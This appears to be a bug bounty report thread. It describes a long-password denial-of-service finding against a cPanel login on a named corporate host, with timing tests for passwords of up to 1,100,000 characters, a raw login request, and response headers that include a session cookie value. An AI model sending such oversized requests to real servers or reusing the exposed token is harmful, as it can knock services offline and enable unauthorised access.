activities.message: Yes but only if you found a security vulnerability, the admin painel itself isn't a vulnerability.
activities.markdown_message: Yes but only if you found a security vulnerability, the admin painel itself isn't a vulnerability.

activities.message:
Long password denial of service

By sending a very long password (1.000.000 characters) it's possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable password hashing implementation. When a long password is sent, the password hashing process will result in CPU and memory exhaustion. 

This vulnerability was detected by sending passwords with various lengths and comparing the measured response times. Consult details for more information.

Vulnerable password input: pass.

Tests performed: 
password of 1000000 characters => 58.063 s
password of 100 characters => 2.047 s
password of 100000 characters => 58.61 s
password of 1100000 characters => 58.047 s
password of 500 characters => 3.469 s

Request
POST /login/ HTTP/1.1
Content-Length: 523
Content-Type: application/x-www-form-urlencoded
Referer: https://directory.corp.ubnt.com:2083/
Host: directory.corp.ubnt.com:2083
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

login=&&user=adminResponse
HTTP/1.1 401 Access Denied
Connection: close
Content-Type: text/html; charset="utf-8"
Date: Thu, 06 Apr 2017 18:30:44 GMT
Cache-Control: no-cache, no-store, must-revalidate, private
Pragma: no-cache
Set-Cookie: cprelogin=no; HttpOnly; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; port=2083; secure
Set-Cookie: cpsession=%3alyxTZXXKCwzzMWDc%2ce1bbd6f28fffe6b6997f7c1fbea21323; HttpOnly; path=/; port=2083; secure
Set-Cookie: roundcube_sessid=expired; HttpOnly; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; port=2083; secure
Set-Cookie: Horde=expired; HttpOnly; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/horde; port=2083; secure
Set-Cookie: PPA_ID=expired; HttpOnly; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; port=2083; secure
Set-Cookie: imp_key=expired; HttpOnly; domain=directory.corp.ubnt.com; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/horde; port=2083; secure
Set-Cookie: key=expired; HttpOnly; domain=directory.corp.ubnt.com; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/3rdparty/squirrelmail/; port=2083; secure
Set-Cookie: SQMSESSID=expired; HttpOnly; domain=directory.corp.ubnt.com; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; port=2083; secure
Cache-Control: no-cache, no-store, must-revalidate, private
Content-Length: 38117
Original-Content-Encoding: gzip

Long password denial of service

By sending a very long password (1.000.000 characters) it's possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable password hashing implementation. When a long password is sent, the password hashing process will result in CPU and memory exhaustion.

This vulnerability was detected by sending passwords with various lengths and comparing the measured response times. Consult details for more information.
